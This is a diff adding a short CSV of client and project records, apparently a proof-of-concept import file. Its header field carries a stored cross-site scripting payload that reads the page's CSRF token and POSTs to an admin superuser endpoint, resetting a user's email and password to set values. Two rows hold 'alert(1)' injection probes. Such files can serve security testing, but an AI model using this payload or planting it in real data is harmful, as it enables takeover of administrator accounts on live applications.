@@ -1,0 +1,8 @@
+Client Name,Client Website,Project Name,Project Status,Project Pricing Model,Budget,"Tagssss`]));var xhr = new XMLHttpRequest();
+xhr.open('POST', '/admin/superusers/loogcn', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('_method=patch&authenticity_token='+encodeURIComponent(document.getElementsByName('csrf-token')[0].content)+'&user%5Bemail%5D=ingo%2Bchaleit%40runn.io&user%5Bpassword%5D=d3FYyi5mV7LvNWH1212&user%5Bpassword_confirmation%5D=d3FYyi5mV7LvNWH1212&commit=Update+User');</script>///"
+61630;alert(1)//938,client.com,sasfasd,Confirmed, Time and Materials,100000,"tag1, tag2"
+First Client,,Secasdfasond Project,Tentative, Fixed Price,,
+Second Client,,Non-billable Project,Confirmed, Non-billable,,
+61630;alert(1)//938,,,,,,
